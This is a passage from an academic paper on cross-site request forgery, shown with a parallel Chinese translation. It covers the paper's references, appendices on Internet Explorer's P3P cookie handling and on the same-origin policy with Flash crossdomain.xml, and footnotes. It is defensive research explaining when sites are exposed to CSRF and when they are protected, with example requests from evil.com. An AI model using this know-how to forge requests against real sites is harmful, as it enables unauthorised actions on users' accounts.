>[13] YouTube Fact Sheet. http://www.youtube. com/t/fact_sheet.

>[14] Ellacoya Data Shows Web Traffic Over- takes Peer-to-Peer (P2P) as Largest Per- centage of Bandwidth on the Network. http://www.ellacoya.com/news/pdf/

>[15] ING Press Release. http://www.rsa.com/ press_release.aspx?id=7220, Aug 2006.

>[16] Alexa Top Sites. http://www.alexa.com/ site/sales, Sep 2007.

>[17] A. Barth, C. Jackson, and J. C. Mitchell. Robust Defenses for Cross-Site Request Forgery. In CCS, 2008.

>[18] A. Bortz and D. Boneh. Exposing private infor- mation by timing web applications. In WWW ’07: Proceedings of the 16th international conference on World Wide Web, pages 621–628, New York, NY, USA, 2007. ACM Press.

>[19] J. Burns. Cross Site Reference Forgery: An in- troduction to a common web application weak- ness. http://www.isecpartners.com/ documents/XSRF_Paper.pdf, 2005.

>[20] D. Endler. The Evolution of Cross Site Scripting Attacks. http://cgisecurity.com/lib/ XSS.pdf, May 2002.

>[21] R. Fielding, J. Gettys, J. Mogul, H. Frystyk, L. Mas- inter, P. Leach, and T. Berners-Lee. Hypertext Trans- fer Protocol – HTTP/1.1, 1999.

>[22] J. Franks, P. Hallam-Baker, J. Hostetler, S. Lawrence, P. Leach, A. Luotonen, and L. Stewart. HTTP Authentication: Basic and Digest Access Authentication, 1999.

>[23] J. Grossman. CSRF, the sleeping giant. http: //jeremiahgrossman.blogspot.com/ 2006/09/csrf-sleeping-giant.html, Sep 2006.

>[24] M. Johns and J. Winter. RequestRodeo: Client Side Protection against Session Riding. In F. Piessens, editor, Proceedings of the OWASP Europe 2006 Conference, refereed papers track, Report CW448, pages 5 – 17. Departement Computerwetenschap- pen, Katholieke Universiteit Leuven, May 2006.

>[25] M. Johns and J. Winter. Protecting the Intranet Against “JavaScript Malware” and Related Attacks. In DIMVA, 2007.

>[26] N. Jovanovic, E. Kirda, and C. Kruegel. Preventing Cross Site Request Forgery Attacks. Securecomm and Workshops, 2006, pages 1–10, Aug. 28 2006- Sept. 1 2006.


> # A Internet Explorer and CSRF
> Cookies can be used to track users across multiple web- sites. For example, suppose an advertiser hosts an image (an ad) on his server that is included by a large number of publisher sites. The advertiser could set a cookie when the image is displayed, which would allow the advertiser to identify a single user as he visits different publisher sites. That is, when the user vists a publisher site and loads the advertiser’s image, his cookie would be sent back to the advertiser and uniquely identified. Advertisers can use these cookies to compile data about users’ surfing habits.
Concern over such an adverse impact of cookies on user privacy led to the creation of the Platform for Privacy Preferences (P3P). P3P “provides a common syntax and transport mechanism that enables Web sites to communi- cate their privacy practices to Internet Explorer 6 (or any other user agent)” [7]. Beginning with Internet Explorer
6, Microsoft began requiring that all sites include a P3P policy in order to receive third-party cookies.
  According to Microsoft

       Advanced cookie filtering works by evaluat- ing a Web site’s privacy practices and deciding which cookies are acceptable based on the site’s compact policies and on the user’s own prefer- ences. In the default settings, cookies that are used to collect personally identifiable informa- tion and do not allow users a choice in their use are considered ”unsatisfactory.” By default, un- satisfactory cookies are deleted in the first-party context when the browsing session ends and are rejected in the third-party context [7].

>(Note that P3P policies are not verified. If a site claims to have an acceptable policy, Internet Explorer allows third-party cookies.)
Suppose a user is on a page that contains an image located on a third-party site. In the context of P3P, the third-party site is potentially dangerous while the page the user is on is considered safe. With CSRF vulnera- bilities, the opposite is true—the page the user is on is potentially dangerous while the third-party site is consid- ered safe (and a potential target of attack). When Internet Explorer considers a third-party site to be dangerous, it prevents cookes from being sent to that site. This effec- tively prevents CSRF attacks when “session cookies” are used, because Internet Explorer is stripping authentication information from cross-site requests.
Internet Explorer’s P3P policy has an interesting effect on CSRF vulnerabilities. Sites with valid P3P policies are not protected against CSRF attacks (Internet Explorer considers these sites safe and allows cookies) while sites without policies are protected (Internet Explorer consid- ers these sites unsafe and blocks cookies) from CSRF at- tacks. Note that this only applies to CSRF vulnerabilities affecting sites using cookies for authentication. Sites using other types of authentication may still be vulnerable to CSRF attacks.
To summarize, Internet Explorer’s use of P3P results in users of IE being protected from CSRF attacks when “session cookie” authentication is used and when target sites do not implement P3P policies. This “protection” is an unintended consequence of P3P policies and should not be exclusively used to prevent CSRF attacks. Sites should instead implement our server-side recommendations, as described in Section 4.1.
```
A Internet Explorer和CSRF

Cookie可用于跟踪多个网站的用户。例如，假设广告商在其服务器上托管被大量发布商网站包含的图片（广告）。广告商可以在显示图片时设置Cookie，这样广告商可以在访问不同的发布商网站时识别一个特定用户。也就是说，当用户访问发布者网站并加载广告商的图像时，他的cookie将被发送回广告商并被唯一标识。广告商可以使用这些cookie来编辑有关用户上网习惯的数据。
关注cookie对用户隐私的这种不利影响导致创建了隐私首选项平台（P3P）。P3P“提供了一个通用的语法和传输机制，使Web站点能与InternetExplorer6（或任何其它用户代理）互通他们的隐私偏好” [7]。从Internet Explorer6开始
，为了接收第三方cookie，Microsoft开始要求所有站点都包含P3P策略。
   据微软称:
       高级cookie过滤的工作通过评估网站的隐私惯例，并根据网站的简洁的政策和用户自己的偏好决定哪些cookie可以接受来实现。在默认设置中，用于收集个人身份信息并且不允许用户选择使用的cookie被视为“不满意”。默认情况下，当浏览会话结束时，在不满意的cookie会被在第一方上下文中删除，并在第三方上下文中被拒绝[7]。。

（请注意，P3P政策未经过验证。如果某个网站声称拥有可接受的政策，则InternetExplorer允许使用第三方Cookie。）
假设用户浏览包含位于第三方网站上的图像的页面。在P3P的上下文中，第三方站点具有潜在危险，而用户所在的页面被认为是安全的。对于CSRF漏洞，情况正好相反，用户所在的页面存在潜在危险，而第三方网站被认为是安全的（并且是潜在的攻击目标）。当Internet Explorer认为第三方站点存在危险时，会阻止将cookes发送到该站点。当使用“会话cookie”时，这有效地防止了CSRF攻击，因为Internet Explorer正在从跨站点请求中删除身份验证信息。
Internet Explorer的P3P策略对CSRF漏洞产生了有趣的影响。具有有效P3P策略的站点不受CSRF攻击保护（Internet Explorer认为这些站点安全并允许cookie），而没有P3P策略的站点却能抵御（Internet Explorer认为这些站点不安全并阻止cookie）CSRF攻击。请注意，这仅适用于影响使用Cookie进行身份验证的网站的CSRF漏洞。使用其他类型身份验证的站点可能仍然容易受到CSRF攻击。
总之，因为Internet Explorer 使用P3P策略，当“会话cookie”认证被使用并且目标网站未执行P3P策略 IE用户也能抵御CSRF攻击。这种“保护”是P3P策略的意外后果，不应仅用于防止CSRF攻击。站点应该实现我们的服务器端建议，如4.1节所述。

```
># B The Same-Origin Policy
>Web browsers have the difficult task of allowing users to maintain secure, private connections with multiple web- sites while also allowing access to untrusted sites that con- tain untrusted code. Additionally, sites are able to load re- sources from different domains. For example, site a.com can load images or JavaScript from b.com using <img> or <script> tags respectively. However, if a user is logged- in to a trusted site, an untrusted third-party should obvi- ously not be able to read the contents of the trusted site. The desire to allow untrusted sites to display data from an external site while still maintaining the privacy of this data led to the creation of the same-origin policy [11]. This policy defines both the meaning of “origin” and the site’s capabilities when accessing data from a different origin. The policy considers “two pages to have the same origin if the protocol, port (if given), and host are the same for both pages” [11]. According to the same-origin policy, a site cannot read or modify a resource from a different ori- gin. It can, however, send a request for a resource from a different origin. Therefore, while evil.com can in- clude the image http://trusted.com/image.gif in its site using the <img> tag, it cannot read the pixel data of this image. Similarly, while evil.com can include http://trusted.com/private.htm in its site using the <iframe> tag, it cannot access or modify the contents of the page displayed by the browser.
The same-origin policy only prevents a third-party site from reading data from another site, it does not prevent these third-party sites from sending requests. Since CSRF attacks are caused by requests being sent (causing some action to be performed on the server-side), the same- origin policy does not prevent CSRF attacks. Instead, it only protects the privacy of the data on third-party sites.
Sites sometimes find it useful or necessary to com- municate across different domains. Adobe has proposed a mechanism, called the cross-domain policy [2], that would allow its Flash plugin to communicate (send and receive data) with different domains in certain cases. This mechanism is currently only used by Flash. Specifi- cally, a site can specify which third-party sites can ac- cess it. A third-party site can only contact a trusted site if that trusted site lists the third-party site in its cross- domain policy file. The following example cross-domain policy file allows access to requests originating from www.friendlysite.com, *.trusted.com, and the IP address 64.233.167.99. These files are named crossdomain.xml and placed at the root of the domain.

```
    <?xml version="1.0"?>
     <cross-domain-policy>
     <allow-access-from
     domain="www.friendlysite.com" />
     <allow-access-from domain="*.trusted.com" />
     <allow-access-from domain="64.233.167.99" />
     </cross-domain-policy>
```
>Suppose the above file were located at http://trusted.com/crossdomain.xml.
If a request were made by evil.com to http://trusted.com/private.htm using Flash, Flash would first load http://trusted.com/ crossdomain.xml to verify that evil.com is listed as a trusted domain. Since it is not in the list, the request would be blocked. On the other hand, Flash would allow the same request from www.friendlysite.com, since it exists in the list of allowed domains.
When used properly, Adobe’s cross-domain policy al- lows both more protection against CSRF attacks than the same-origin policy (the request cannot even be ini- tiated unless a matching crossdomain.xml is found) and more flexibility (cross-domain communication is al- lowed if the target site trusts the initiating site). How- ever, the cross-domain policy is often used improperly, where a target site puts an “accept all” clause. This allows third-party access from any site, whether malignant or benign. This improper and extremely dangerous use of crossdomain.xml files is even perpetuated by what ap- pears to be an Adobe affiliated8 site, crossdomainxml. org. This site provides an example of this “accept all” cross-domain policy file, with absolutely no explanation of the dangers involved in using this policy file. For more information on the dangers of using this type of cross- domain policy file, see Chris Shiflett ([30] and [29]).
We analyzed 500 top websites [16] and found 143 us- ing crossdomain.xml policy files. Of those 143 sites, 47 sites accept all connections from third-party sites, pos- sibly resulting in CSRF vulnerabilities.
Adobe’s cross-domain policy can be effective and safe, when used with care. However, care must be taken to explain the dangers of the “accept all” solution.

```
B 同源政策

Web浏览器的艰巨任务是允许用户维护与多个网站的安全私密连接的同时，还允许访问包含不受信任代码的不受信任的站点。此外，站点还可以从不同的域加载资源。例如，站点a.com可以分别使用<img>或<script>标记从b.com加载图像或JavaScript。但是，如果用户登录到受信任的站点，则不受信任的第三方应该无法读取受信任站点的内容。允许不受信任的站点显示来自外部站点的数据同时仍保持此数据的隐私的愿望致使同源策略[11]的产生。当从不同来源访问数据时，此策略定义“origin”的含义和站点的功能。如果两个页面的协议，端口（如果给定）和主机相同，则策略认为“两个页面具有相同的原点”[11]。根据同源策略，站点无法从不同源的站点读取或修改资源。但是，它可以发送来自不同来源的资源请求。因此，虽然evil.com可以使用<img>标签在其站点中包含图像http://trusted.com/image.gif，但它无法读取此图像的像素数据。同样，虽然evil.com可以使用<iframe>标记在其站点中包含http://trusted.com/private.htm，但它无法访问或修改浏览器显示的页面内容。

同源策略仅阻止第三方站点从其他站点读取数据，但不会阻止这些第三方站点发送请求。由于CSRF攻击是由发送的请求引起的（导致在服务器端执行某些操作），因此同源策略不会阻止CSRF攻击，相反，它仅保护第三方站点上数据的隐私。
网站有时会发现在不同的域之间进行通信是有用的或必要的。 Adobe提出了一种称为跨域策略的机制[2]，允许其Flash插件在某些情况下与不同的域进行通信（发送和接收数据）。此机制目前仅供Flash使用。具体而言，站点可以指定哪些第三方站点可以访问它。只有该受信任站点在其跨域策略文件中列出第三方站点，第三方站点才能与该受信任站点联系。以下示例跨域策略文件允许访问源自www.friendlysite.com，* .trusted.com和IP地址64.233.167.99的请求。这些文件名为crossdomain.xml，位于域的根目录下。
     <?xml version="1.0"?>
     <cross-domain-policy>
     <allow-access-from
     domain="www.friendlysite.com" />
     <allow-access-from domain="*.trusted.com" />
     <allow-access-from domain="64.233.167.99" />
     </cross-domain-policy>

假设上述文件位于http://trusted.com/crossdomain.xml。
如果evil.com使用Flash向http://trusted.com/private.htm发出请求，Flash将首先加载http://trusted.com/ crossdomain.xml以验证evil.com是否被列为受信任者域。因为它不在列表中，所以将阻止请求。另一方面，Flash会允许来自www.friendlysite.com的相同请求，因为它存在于允许的域列表中。

如果使用得当，Adobe的跨域策略比起同源策略（除非找到匹配的crossdomain.xml，否则甚至无法启动请求）可以提供更多针对CSRF攻击的保护和更大的灵活性（如果目标站点信任发起站点，则允许跨域请求）。但是，跨域策略经常被不正确地使用，其中目标站点设置为“全部接受”条款。这使得任何网站都可以访问第三方，无论是恶性还是良性。 这种对crossdomain.xml文件的不正确和极其危险的使用甚至可以通过Adobe affiliated8站点，crossdomain.xml.org来实现。 此站点提供了此“接受所有”跨域策略文件的示例，绝对没有解释使用此策略文件所涉及的危险。 有关使用此类跨域策略文件的危险的更多信息，请参阅Chris Shiflett（[30]和[29]）。

我们分析了500个顶级网站[16]，发现有143个使用crossdomain.xml策略文件。在这143个站点中，47个站点接受来自第三方站点的所有连接，可能导致CSRF漏洞。

当小心使用时，Adobe的跨域策略可以是有效且安全的。 但是，必须注意解释“全部接受”解决方案的危险性。
```






---
1Cross-Site Request Forgery attacks are also known as Cross-Site Reference Forgery, XSRF, Session Riding and Confused Deputy attacks. We use the term CSRF because it appears to be the most commonly used term for this type of attack.

2A search for “cross site scripting” (which differs from CSRF) on the ACM Digital Library returned 72 papers, while a search for “xsrf OR csrf” returned only four papers. A search for “xss” on Safari Books Online (a collection of 4752 books on technology) showed the term ap- peared in 96 books, while “csrf OR xsrf” appeared in only 13 books.

3The URL data is encoded, turning @ into %40, etc

4ING Direct allows checking accounts to be created instantly with any initial amount of money.

5We assume an adversary cannot modify a user’s cookies
6Our Code Igniter Plugin: http://www.cs.princeton.edu/  ̃wzeller/csrf/ci

7Our CSRF Firefox Plugin: http://www.cs.princeton. edu/ ̃wzeller/csrf/protector/

8The domain crossdomainxml.org is registered to
Theodore E Patrick of PowerSDK Software Corp who claims to be a “Technical Evangelist for Flex at Adobe Systems” on his LinkedIn profile (http://www.linkedin.com/in/tedpatrick)

```
1跨站点请求伪造攻击也称为跨站点参数伪造，XSRF，会话控制和混乱的副攻击。 我们使用术语CSRF，因为CSRF似乎是此类攻击最常用的术语。

2A搜索ACM数字图书馆的“跨站点脚本”（与CSRF不同）显示了72篇论文，而搜索“xsrf OR csrf”只显示了4篇论文。 在Safari Books Online（4752本关于技术的书籍的集合）中搜索“xss”显示该术语出现在96本书中，而“csrf OR xsrf”仅出现在13本书中。

3URL数据被编码，将@转换为％40等

4ING直接允许用户以任何初始金额创建支票帐户。

5我们假设对手无法修改用户的cookie

6我们Code Igniter 插件：http：//www.cs.princeton.edu/ wzeller / csrf / ci

7我们的CSRF Firefox插件：http：//www.cs.princeton。 edu / wzeller / csrf / protector /

8域名crossdomainxml.org已注册
PowerSDK软件公司的Theodore E Patrick，他在他的LinkedIn个人资料中声称自己是“Adobe Systems的Flex技术布道师”（http://www.linkedin.com/in/tedpatrick）
```
